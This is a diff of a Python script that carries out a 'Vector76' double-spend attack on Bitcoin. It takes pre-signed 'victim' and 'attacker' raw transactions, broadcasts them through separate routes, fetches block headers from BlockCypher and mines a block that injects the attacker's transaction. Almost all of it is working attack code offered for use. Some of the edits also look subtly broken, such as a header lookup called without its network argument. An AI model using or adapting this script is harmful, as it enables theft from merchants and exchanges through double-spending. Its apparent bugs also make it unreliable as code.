@@ -1,14 +1,10 @@
 import time
 import argparse
-import bitcoin
 import requests
 import subprocess
-import bitcoin.rpc
 
 from datetime import datetime
 from hashlib import sha256
-from bitcoin_tools.core.transaction import TX
-from bitcoin_tools.core.keys import load_keys
 from bitcoinrpc.authproxy import AuthServiceProxy, JSONRPCException
 
 parser = argparse.ArgumentParser(description="How To Use vector76")
@@ -24,18 +20,6 @@ parser.add_argument("username",
 parser.add_argument("password",
                     help="Node password",
                     type=str)
-parser.add_argument("attacker_signkey",
-                    help="The attacker has the WIF format private key of the first address (this is used to sign the transaction)",
-                    type=str)
-parser.add_argument("victim_address",
-                    help="victim address.",
-                    type=str)
-parser.add_argument("attacker_address",
-                    help="Address held by attacker to receive refund (Please prepare an address that is different from the address that can be generated with the private key specified in the first place.)",
-                    type=str)
-parser.add_argument("amount_of_coins",
-                    help="Amount of coins sent. (Enter in BTC units)",
-                    type=float)
 parser.add_argument("prev_deposit_TXID",
                     help="Last deposit TXID of first attacker address",
                     type=str)
@@ -43,7 +27,8 @@ parser.add_argument("--network",
                     help="mainnet or testnet. (Default = test3)",
                     type=str,
                     default="test3")
-
+tx_victim   = input("Send to victim rawtx   (V1) : ")
+tx_attacker = input("Send to attacker rawtx (V2) : ")
 def to_satoshi(btc_amount):
     satoshi = 0.00000001
     return btc_amount // satoshi
@@ -129,18 +114,63 @@ def mine_vector76_block(block_header_V, inject_tx):
     print(f"Block Hash : {block_hash}")
     return block_hash
 
+def get_block_header_by_txid(txid, network):
+    # URL to get transaction information
+    tx_url = f'https://api.blockcypher.com/v1/btc/{network}/txs/{txid}'
+    
+    # Request transaction information
+    tx_response = requests.get(tx_url)
+    if tx_response.status_code != 200:
+        print(f"Error while retrieving transaction information: {tx_response.status_code}")
+        return
+    
+    tx_data = tx_response.json()
+    
+    # Obtaining a block hash from transaction data
+    block_hash = tx_data.get('block_hash')
+    if not block_hash:
+        print("Transaction not found in block.")
+        return
+    
+    # URL to get block information
+    block_url = f'https://api.blockcypher.com/v1/btc/{network}/blocks/{block_hash}'
+    
+    # Request information about a block
+    block_response = requests.get(block_url)
+    if block_response.status_code != 200:
+        print(f"Error while retrieving block information: {block_response.status_code}")
+        return
+    
+    block_data = block_response.json()
+    
+    # Getting Block Header
+    block_header = {
+        'Block': block_data.get('hash'),
+        'Block Height': block_data.get('height'),
+        'Mined Time': block_data.get('time'),
+        'Prev Block': block_data.get('prev_block'),
+        'Merkle Root': block_data.get('mrkl_root'),
+        'Nonce': block_data.get('nonce'),
+        'Bits': block_data.get('bits'),
+        'Version': block_data.get('ver')
+    }
+    print(f"Block: {block_data.get('hash')}")
+    print(f"Block Height: {block_data.get('height')}")
+    print(f"Mined Time: {block_data.get('time')}")
+    print(f"Prev Block :  {block_data.get('prev_block')}")
+    print(f"Merkle Root : {block_data.get('mrkl_root')}")
+    print(f"Nonce: {block_data.get('nonce')}")
+    print(f"Bits: {block_data.get('bits')}")
+    print(f"Version: {block_data.get('ver')}")
+    return block_header
 
 args = parser.parse_args()
 rpc_host = args.node_host
 rpc_port = args.node_port
 username = args.username
 password = args.password
-key      = args.attacker_signkey
-victim_address   = args.victim_address
-attacker_address = args.attacker_address
-amount_BTC = args.amount_of_coins
 prev_txid  = args.prev_deposit_TXID
-network = args.network
+network    = args.network
 
 if (network != "main") and (network != "test3"):
     network = "test3"
@@ -152,39 +182,26 @@ rpc_node = AuthServiceProxy(f"http://{username}:{password}@{rpc_host}:{rpc_port}
 print(rpc_node.getrawtransaction(prev_txid))
 print()
 fee_satoshi = 1500
-print("sign T1")
-sk, pk = load_keys(attacker_address)
-#bitcoin.add_privkeys(key)
-amount_satoshi = to_satoshi(amount_BTC)
-send_amount = amount_satoshi - fee_satoshi
-tx_victim = TX.build_from_io(prev_txid, 0, send_amount, victim_address)
-tx_victim = tx_victim.sign(sk, 0).serialize()
-print(tx_victim)
-block_header_V = get_block_header_by_txid(prev_txid, network)
-print("Mining Vector76 Block...")
-tx_attacker = TX.build_from_io(prev_txid, 0, send_amount, attacker_address)
-tx_attacker = tx_attacker.sign(sk, 0).serialize()
-vector76_block = mine_vector76_block(block_header_V, tx_attacker) # 一つ目のトランザクション = 
 print("sign T2")
 print("--------------------")
-print(f"Send Amount (BTC)      : {amount_BTC}")
-print(f"Victim   Address       : {victim_address}")
-print(f"Attacker Address       : {attacker_address}")
 print(f"V1 RawTx               : {tx_victim}")
 print(f"V2 RawTx               : {tx_attacker}")
-print(f"Mined Vector76 Block Hash : {vector76_block}")
 print("--------------------")
 
 print("[+] READY...")
 input(" --- Press the enter key to continue the Vector76 attack... --- ")
 #print(amount_satoshi)
 print()
+
 print("push V1 TX...")
 broadcast_transaction(tx_victim)
 print()
 print("push V2 TX...")
-result = rpc_node.sendrawtransaction(tx_attacker) # 念の為V1とは別のやり方で
-print(f"[+] {result}")
+result = rpc_node.sendrawtransaction(tx_attacker) # 念の為V1とは別の送信先で
+print("Request blockheader...")
+block_header_V = get_block_header_by_txid(prev_txid)
+vector76_block = mine_vector76_block(block_header_V, tx_attacker) # 一つ目のトランザクション = 
+print(f"Mined Vector76 Block Hash : {vector76_block}")
 print()
 #print("Request Blockheader...")
 #block_header_V = get_block_header_by_txid(prev_txid)
